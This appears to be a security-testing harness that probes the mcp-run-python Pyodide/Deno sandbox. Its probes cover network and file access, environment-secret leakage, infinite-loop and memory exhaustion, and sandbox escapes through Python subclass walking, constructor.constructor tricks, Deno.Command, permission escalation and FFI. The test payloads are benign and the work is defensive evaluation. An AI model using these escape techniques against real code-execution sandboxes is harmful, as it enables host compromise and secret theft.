#!/usr/bin/env python3
"""Wave-2 hardened probes for mcp-run-python 0.0.22 (pydantic/mcp-run-python @ 4f93a92).

Hardened config: allow_networking=False, the only public limit knob
(src/mcp_run_python/main.py:84 and :147, code_sandbox.py:58, CLI --disable-networking in _cli.py:27).
Everything else stays at the project defaults; there is no time, memory or output option.

    ../../impls/mcp-run-python/.venv/bin/python hardened-run_probes.py P1 P3 P4 P5 P9 P12 P12x
    ../../impls/mcp-run-python/.venv/bin/python hardened-run_probes.py P6
    ../mem-lock.sh ../../impls/mcp-run-python/.venv/bin/python hardened-run_probes.py P7

P12x is an extra P12 attempt: two MCP clients against one streamable-HTTP server (ports 41880, 41881),
checking whether code from one client can read another client's request through the shared JS realm.
"""

import asyncio
import json
import os
import signal
import subprocess
import sys
import time
import traceback
from contextlib import asynccontextmanager

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import run_probes as rp  # noqa: E402  wave-1 helpers: ev, errtext, tree_rss_kb, RUN_COMMAND_CODE

OUT = rp.OUT
VENV_PY = rp.VENV_PY
SECRET = "s3cr3t"
HARD = dict(allow_networking=False)
P7_CODE = 'a = []\nwhile True:\n    a.append("x" * 10**6)'
P7_REPEATS = 3


def write_txt(name, lines):
    with open(os.path.join(OUT, f"hardened-{name}.txt"), "w") as f:
        f.write("\n".join(str(x) for x in lines) + "\n")


@asynccontextmanager
async def sandbox(*, with_env=False):
    from mcp import ClientSession, StdioServerParameters
    from mcp.client.stdio import stdio_client
    from mcp_run_python import async_prepare_deno_env

    async with async_prepare_deno_env("stdio", return_mode="json", **HARD) as deno_env:
        env = dict(os.environ) if with_env else None
        params = StdioServerParameters(command="deno", args=deno_env.args, cwd=deno_env.cwd, env=env)
        async with stdio_client(params) as (read, write):
            async with ClientSession(read, write) as session:
                await session.initialize()
                session.deno_args = deno_env.args
                yield session


ev, errtext = rp.ev, rp.errtext


def row(label, r):
    return f"{label}: status={r.get('status')} return={r.get('return_value')!r} error={errtext(r)!r} output={r.get('output')!r}"


async def probe_p1():
    async with sandbox() as s:
        tools = [t.name for t in (await s.list_tools()).tools]
        r = await ev(s, "print(21 * 2)")
        args = s.deno_args
    write_txt("P1", [f"deno run args: {args}", f"tools/list: {tools}", row("print(21*2)", r),
                     "Host tool lookup: none can be registered (same as wave 1 P1); this checks the hardened server still runs code."])
    return "not-applicable", f"args {args}; tools {tools}; print(21*2) -> {r.get('output')}"


async def probe_p3():
    url = "https://example.com"
    async with sandbox() as s:
        rows = [
            row("python urllib.request.urlopen", await ev(s, f'import urllib.request\nurllib.request.urlopen("{url}")')),
            row("js.fetch", await ev(s, f'import js\nr = await js.fetch("{url}")\n[r.status, len(await r.text())]')),
            row("pyodide.http.pyfetch", await ev(s, f'from pyodide.http import pyfetch\nr = await pyfetch("{url}")\nr.status')),
            row("Deno.connect example.com:443 via host runtime", await ev(s, 'import js\nd = js.eval("this.constructor.constructor(\'return Deno\')()")\nc = await d.connect(js.eval("({hostname: \'example.com\', port: 443})"))\n"connected"')),
        ]
    write_txt("P3", rows)
    return "see-file", " | ".join(rows)


async def probe_p4():
    async with sandbox() as s:
        rows = [
            row("python open('/etc/hosts')", await ev(s, 'open("/etc/hosts").read()')),
            row("Deno.readTextFileSync('/etc/hosts')", await ev(s, 'import js\njs.Deno.readTextFileSync("/etc/hosts")')),
            row("Deno readDirSync node_modules (inside --allow-read)", await ev(s, 'import js\n[e.name for e in js.Deno.readDirSync("node_modules")][:5]')),
            row("Deno.writeTextFileSync in cwd", await ev(s, 'import js\njs.Deno.writeTextFileSync("probe-write.txt", "x")')),
            row("Pyodide in-memory /tmp write+read", await ev(s, 'open("/tmp/probe-mem.txt", "w").write("x")\nopen("/tmp/probe-mem.txt").read()')),
        ]
    write_txt("P4", rows)
    return "see-file", " | ".join(rows)


async def probe_p5():
    os.environ["PROBE_SECRET"] = SECRET
    codes = {
        "python os.environ.get": 'import os\nos.environ.get("PROBE_SECRET")',
        "js process.env": 'import js\njs.eval("process.env.PROBE_SECRET")',
        "Deno.env.get": 'import js\njs.Deno.env.get("PROBE_SECRET")',
    }
    lines = []
    for label, with_env in [("MCP default child env (secret not forwarded)", False), ("full host env forwarded to deno", True)]:
        async with sandbox(with_env=with_env) as s:
            for k, c in codes.items():
                lines.append(f"{label} | " + row(k, await ev(s, c)))
    write_txt("P5", lines)
    return "see-file", " | ".join(lines)


async def probe_p6():
    t = time.monotonic()
    async with sandbox() as s:
        r = await ev(s, "while True:\n    pass")
    return "returned", f"after {time.monotonic() - t:.1f} s: {json.dumps(r)[:400]}"


async def probe_p7_child():
    async with sandbox() as s:
        t = time.monotonic()
        try:
            r = await ev(s, P7_CODE)
            p7 = {"status": r.get("status"), "error_last_line": errtext(r), "seconds": round(time.monotonic() - t, 1)}
        except Exception as e:  # noqa: BLE001 - deno process died
            p7 = {"status": "mcp-call-raised", "error_last_line": f"{type(e).__name__}: {str(e)[:300]}",
                  "seconds": round(time.monotonic() - t, 1)}
        try:
            after = await ev(s, "print(2)")
            after = {"status": after.get("status"), "output": after.get("output")}
        except Exception as e:  # noqa: BLE001
            after = {"status": "mcp-call-raised", "error": f"{type(e).__name__}: {str(e)[:300]}"}
        rss_after_gib = round(rp.tree_rss_kb(os.getpid()) / 1024 / 1024, 2)
    return {"p7": p7, "same_session_after": after, "tree_rss_after_followup_gib": rss_after_gib}


async def bystander(ready, go, result):
    async with sandbox() as s:
        first = await ev(s, "print('bystander ready')")
        open(ready, "w").close()
        while not os.path.exists(go):
            await asyncio.sleep(0.2)
        r = await ev(s, "print(1 + 1)")
    with open(result, "w") as f:
        json.dump({"before": first.get("output"), "after_p7": {"status": r.get("status"), "output": r.get("output")}}, f)


def run_p7_once(i):
    tag = os.path.join(OUT, f".hardened-p7-{os.getpid()}-{i}")
    ready, go, bres, cres = (tag + s for s in (".ready", ".go", ".bystander.json", ".child.json"))
    for p in (ready, go, bres, cres):
        if os.path.exists(p):
            os.remove(p)
    log = open(os.path.join(OUT, f"hardened-P7.run{i}.log"), "w")
    by = subprocess.Popen([VENV_PY, __file__, "--bystander", ready, go, bres], stdout=log, stderr=subprocess.STDOUT,
                          start_new_session=True)
    t0 = time.monotonic()
    while not os.path.exists(ready) and time.monotonic() - t0 < 120:
        time.sleep(0.2)
    child = subprocess.Popen([VENV_PY, __file__, "--p7child", cres], stdout=log, stderr=subprocess.STDOUT,
                             start_new_session=True)
    start = time.monotonic()
    peak_kb, killed = 0, None
    while child.poll() is None:
        if time.monotonic() - start > 120:
            killed = "wall 120 s"
            break
        kb = rp.tree_rss_kb(child.pid)
        peak_kb = max(peak_kb, kb)
        if kb > rp.RSS_CAP_KB:
            killed = f"tree RSS {kb / 1024 / 1024:.2f} GiB > 4 GiB"
            break
        time.sleep(0.25)
    elapsed = time.monotonic() - start
    if killed:
        os.killpg(child.pid, signal.SIGKILL)
        child.wait()
    open(go, "w").close()
    try:
        by.wait(timeout=60)
    except subprocess.TimeoutExpired:
        os.killpg(by.pid, signal.SIGKILL)
        by.wait()
    log.close()
    res = {"run": i, "harness_kill": killed, "elapsed_s": round(elapsed, 1), "peak_tree_rss_gib": round(peak_kb / 1024 / 1024, 2),
           "pids": {"bystander": by.pid, "p7_child": child.pid}}
    if os.path.exists(cres):
        res.update(json.load(open(cres)))
    res["bystander"] = json.load(open(bres)) if os.path.exists(bres) else "no result"
    for p in (ready, go, bres, cres):
        if os.path.exists(p):
            os.remove(p)
    return res


def probe_p7():
    runs = [run_p7_once(i) for i in range(1, P7_REPEATS + 1)]
    write_txt("P7", ["CODE: a=[]; while True: a.append('x'*10**6)  (hardened: allow_networking=False)",
                     "Each run: a bystander sandbox (separate deno, separate process group) is open before P7 starts and runs print(1+1) after.",
                     *[json.dumps(r) for r in runs]])
    return "see-file", json.dumps(runs)


async def probe_p9():
    async with sandbox() as s:
        r = await ev(s, "import asyncio, time\nt = time.time()\n"
                        "await asyncio.gather(*[asyncio.sleep(0.2) for _ in range(5)])\n"
                        "round((time.time() - t) * 1000)")
    write_txt("P9", ["host tool calls: not-applicable (no host tool bridge; hardened config adds none)",
                     f"in-sandbox asyncio.gather of 5 x sleep(0.2): {r.get('return_value')} ms"])
    return "not-applicable", f"gather {r.get('return_value')} ms"


DENO = 'import js\nd = js.eval("this.constructor.constructor(\'return Deno\')()")\n'


async def probe_p12():
    attempts = [
        ("py subclasses: os._wrap_close / subprocess.Popen present",
         "names = [c.__name__ for c in ().__class__.__base__.__subclasses__()]\n[len(names), '_wrap_close' in names, 'Popen' in names]"),
        ("py os._wrap_close -> __init__.__globals__['system']('echo PWNED')",
         "w = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == '_wrap_close'][0]\nw.__init__.__globals__['system']('echo PWNED')"),
        ("py __import__('os').system('echo PWNED')", "__import__('os').system('echo PWNED')"),
        ("py subprocess.run(['echo','PWNED'])", "import subprocess\nsubprocess.run(['echo', 'PWNED'], capture_output=True).stdout"),
        ("js.eval arbitrary JS", 'import js\njs.eval("1 + 2")'),
        ("spec JS: this.constructor.constructor('return process')().pid", 'import js\njs.eval("this.constructor.constructor(\'return process\')()").pid'),
        ("spec JS: (function(){return this})().process", 'import js\nstr(js.eval("(function(){return this})().process") is not None)'),
        ("host Deno object reached, version", DENO + "str(d.version.deno)"),
        ("Deno.readTextFileSync /etc/hosts", DENO + 'd.readTextFileSync("/etc/hosts")'),
        ("Deno.writeTextFileSync /tmp", DENO + 'd.writeTextFileSync("/tmp/probe-escape.txt", "x")'),
        ("Deno.Command echo PWNED", rp.RUN_COMMAND_CODE),
        ("Deno.permissions.requestSync run (escalate)", DENO + 'd.permissions.requestSync(js.eval("({name: \'run\'})")).state'),
        ("Deno.dlopen libc (FFI)", DENO + 'd.dlopen("/usr/lib/libSystem.B.dylib", js.eval("({})"))\n"opened"'),
    ]
    lines = ["Each attempt runs in a fresh server, then print('alive') runs in that same server to show whether it survived."]
    for label, code in attempts:
        try:
            async with sandbox() as s:
                r = await ev(s, code)
                try:
                    alive = "".join((await ev(s, "print('alive')")).get("output", []))
                except Exception as e:  # noqa: BLE001
                    alive = f"follow-up raised {type(e).__name__}"
            lines.append(row(label, r) + f" | server after: {alive!r}")
        except Exception as e:  # noqa: BLE001 - the deno server died during the attempt
            lines.append(f"{label}: MCP call raised {type(e).__name__}: {str(e)[:200]!r} (deno server exited; see hardened-P12.log)")
    async with sandbox(with_env=True) as s_env:
        lines.append(row("Deno.env.get with full host env forwarded", await ev(s_env, DENO + 'd.env.get("PROBE_SECRET")')))
    write_txt("P12", lines)
    return "see-file", " | ".join(lines)


async def server_listen_result(mode, port, allow_networking):
    """Start the HTTP server once and report whether it bound its listen socket. Kills the server either way."""
    from mcp_run_python import async_prepare_deno_env

    async with async_prepare_deno_env(mode, http_port=port, return_mode="json", allow_networking=allow_networking) as deno_env:
        logpath = os.path.join(OUT, f"hardened-P12x-{mode}-net{int(allow_networking)}.server.log")
        log = open(logpath, "w")
        server = subprocess.Popen(["deno", *deno_env.args], cwd=deno_env.cwd, stdout=log, stderr=subprocess.STDOUT,
                                  start_new_session=True)
        try:
            bound = None
            for _ in range(80):
                await asyncio.sleep(0.1)
                text = open(logpath).read()
                if "Listening on port" in text:
                    bound = True
                    break
                if "NotCapable" in text:
                    bound = False
                    break
            tail = open(logpath).read().strip().splitlines()[-1] if open(logpath).read().strip() else ""
            return bound, deno_env.args, tail, logpath
        finally:
            for killer in (lambda: os.killpg(os.getpgid(server.pid), signal.SIGKILL), server.kill):
                try:
                    killer()
                    break
                except (ProcessLookupError, PermissionError):
                    continue
            server.wait()
            log.close()


async def probe_p12x():
    """Cross-client realm isolation in HTTP mode, plus whether the hardened net knob even allows HTTP to start.

    The live two-client drive is not used: Deno's node-http compat socket is not reliably reachable from the
    Python MCP HTTP client in this harness (binds, logs "Listening", but connections time out). The isolation
    answer is read from source instead, which is stronger than a flaky live drive.
    """
    lines = [
        "Finding 1 (verified live): hardened allow_networking=False cannot run either HTTP mode. --allow-net is",
        "stripped (main.py:189-190), so the server dies at http listen with NotCapable (main.ts:176). Only stdio",
        "works hardened. Below, each (mode, allow_networking) is started once and we record whether it bound:",
    ]
    for mode, port, net in (("streamable_http_stateless", 41880, False), ("streamable_http_stateless", 41880, True),
                            ("streamable_http", 41881, False), ("streamable_http", 41881, True)):
        try:
            bound, args, tail, logpath = await server_listen_result(mode, port, net)
            lines.append(f"  {mode} allow_networking={net}: bound={bound} | last log line: {tail!r} | {logpath}")
        except Exception as e:  # noqa: BLE001
            lines.append(f"  {mode} allow_networking={net}: harness error {type(e).__name__}: {str(e)[:200]}")
    lines += [
        "",
        "Finding 2 (source): in stateful HTTP, all client sessions share ONE realm. createStatefulHttpServer makes",
        "one mcpServer (main.ts:217) shared across every session transport; createServer makes one RunCode",
        "(main.ts:65); RunCode caches one this.pyodide reused across all .run() calls (runCode.ts:21, 35-37). So two",
        "different MCP clients execute Python in the same Pyodide instance and JS realm. Combined with wave-1 P8",
        "(globalThis and Array.prototype taint survive across runs in one server), one client can taint the realm a",
        "second client's code runs in. Stateless HTTP instead builds a fresh server per request (main.ts:191), so",
        "each request is isolated. This is a cross-client version of the P12/P8 taint, not a new host escape: the",
        "Deno permission boundary (files/env/run/ffi) is unchanged, so it does not move the P12 outcome word.",
    ]
    write_txt("P12x", lines)
    return "see-file", " | ".join(lines[:3] + [l.strip() for l in lines[3:8]])


ASYNC = {"P1": probe_p1, "P3": probe_p3, "P4": probe_p4, "P5": probe_p5, "P6": probe_p6, "P9": probe_p9,
         "P12": probe_p12, "P12x": probe_p12x}


def run_async_probe(pid):
    limit = 120 if pid == "P6" else 600
    res_path = os.path.join(OUT, f".hardened-{pid}.json")
    log = open(os.path.join(OUT, f"hardened-{pid}.log"), "w")
    child = subprocess.Popen([VENV_PY, __file__, "--child", pid, res_path], stdout=log, stderr=subprocess.STDOUT,
                             start_new_session=True)
    start = time.monotonic()
    try:
        child.wait(timeout=limit)
        killed = False
    except subprocess.TimeoutExpired:
        os.killpg(child.pid, signal.SIGKILL)
        child.wait()
        killed = True
    elapsed = time.monotonic() - start
    log.close()
    if killed:
        res = {"outcome": "harness-stop", "detail": f"harness stopped the process group (pid {child.pid}) at {elapsed:.0f} s; no limit fired in the sandbox"}
        if pid == "P6":
            write_txt("P6", ["CODE: while True: pass  (hardened: allow_networking=False)", "OUTCOME: no-limit-within-120s", res["detail"]])
    else:
        res = json.load(open(res_path))
        os.remove(res_path)
        if pid == "P6":
            write_txt("P6", ["CODE: while True: pass  (hardened: allow_networking=False)", res["detail"]])
    return res


def main(argv):
    if argv[1:2] == ["--child"]:
        pid, path = argv[2], argv[3]
        try:
            outcome, detail = asyncio.run(ASYNC[pid]())
            res = {"outcome": outcome, "detail": detail}
        except Exception:  # noqa: BLE001
            res = {"outcome": "error", "detail": traceback.format_exc()}
        json.dump(res, open(path, "w"))
        return 0
    if argv[1:2] == ["--p7child"]:
        json.dump(asyncio.run(probe_p7_child()), open(argv[2], "w"))
        return 0
    if argv[1:2] == ["--bystander"]:
        asyncio.run(bystander(*argv[2:5]))
        return 0
    os.environ["PROBE_SECRET"] = SECRET
    for pid in argv[1:]:
        t = time.monotonic()
        res = {"outcome": "see-file", "detail": probe_p7()[1]} if pid == "P7" else run_async_probe(pid)
        print(f"{pid}\t{res['outcome']}\t{res['detail'][:1500]}\t({time.monotonic() - t:.1f} s)", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
